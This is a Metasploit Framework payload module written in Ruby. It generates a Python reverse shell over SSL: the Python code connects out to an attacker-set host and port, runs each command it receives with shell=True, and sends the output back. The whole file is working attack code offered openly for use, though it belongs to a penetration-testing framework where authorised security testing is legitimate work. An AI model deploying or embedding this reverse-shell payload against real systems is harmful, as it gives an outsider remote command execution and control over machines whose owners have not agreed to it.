##
# This module requires Metasploit: http//metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'
require 'msf/core/payload/python'
require 'msf/core/handler/reverse_tcp_ssl'
require 'msf/base/sessions/command_shell'
require 'msf/base/sessions/command_shell_options'

module Metasploit3

  include Msf::Payload::Single
  include Msf::Payload::Python
  include Msf::Sessions::CommandShellOptions

  def initialize(info = {})
    super(merge_info(info,
      'Name'          => 'Python Command Shell, Reverse TCP SSL',
      'Description'   => 'Creates an interactive shell via python, uses SSL, encodes with base64 by design.',
      'Author'        => 'RageLtMan',
      'License'       => BSD_LICENSE,
      'Platform'      => %w{ linux osx python unix win },
      'Handler'       => Msf::Handler::ReverseTcpSsl,
      'Session'       => Msf::Sessions::CommandShell,
      'Payload'       =>
        {
          'Offsets' => { },
          'Payload' => ''
        }
      ))
  end

  #
  # Constructs the payload
  #
  def generate
    super + command_string
  end

  #
  # Returns the command string to use for execution
  #
  def command_string
    cmd = ''
    dead = Rex::Text.rand_text_alpha(2)
    # Set up the socket
    cmd << "import socket,subprocess,os,ssl\n"
    cmd << "so=socket.socket(socket.AF_INET,socket.SOCK_STREAM)\n"
    cmd << "so.connect(('#{ datastore['LHOST'] }',#{ datastore['LPORT'] }))\n"
    cmd << "s=ssl.wrap_socket(so)\n"
    # The actual IO
    cmd << "#{dead}=False\n"
    cmd << "while not #{dead}:\n"
    cmd << "\tdata=s.recv(1024)\n"
    cmd << "\tif len(data)==0:\n\t\t#{dead} = True\n"
    cmd << "\tproc=subprocess.Popen(data,shell=True,stdout=subprocess.PIPE,stderr=subprocess.PIPE,stdin=subprocess.PIPE)\n"
    cmd << "\tstdout_value=proc.stdout.read() + proc.stderr.read()\n"
    cmd << "\ts.send(stdout_value)\n"

    flatten(cmd)
  end
end
